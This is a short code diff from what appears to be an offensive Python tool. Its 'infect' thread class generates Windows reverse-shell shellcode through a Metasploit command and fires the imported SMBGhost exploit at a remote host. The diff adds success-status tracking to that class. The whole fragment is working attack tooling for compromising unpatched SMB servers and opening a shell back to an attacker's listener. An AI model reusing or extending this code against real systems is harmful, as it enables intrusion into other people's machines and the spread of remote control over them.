@@ -5,11 +5,12 @@ import armory.SMBGhost.exploit as exploit
 
 class infect(threading.Thread):
     
-    def __init__(self, rhost, rport, lhost, lport):
+    def __init__(self, rhost, rport, lhost, lport,status=False):
         self.rhost=rhost
         self.rport=rport
         self.lhost=lhost
         self.lport=lport
+        self.status = status
         super().__init__()
         
     def run(self):
@@ -33,6 +34,11 @@ class infect(threading.Thread):
 
         return bytes.fromhex((subprocess.check_output(msf_command, shell=True).decode('ascii')))
     
+    def get_status(self):
+        return self.status
+    
     def inject(self):
         shell = self.generate_windows_shellcode(self.lhost,self.lport)
         result = exploit.exploit_SMBGhost(self.rhost, self.rport, shell)
+        print("Succuess")
+        self.status = True
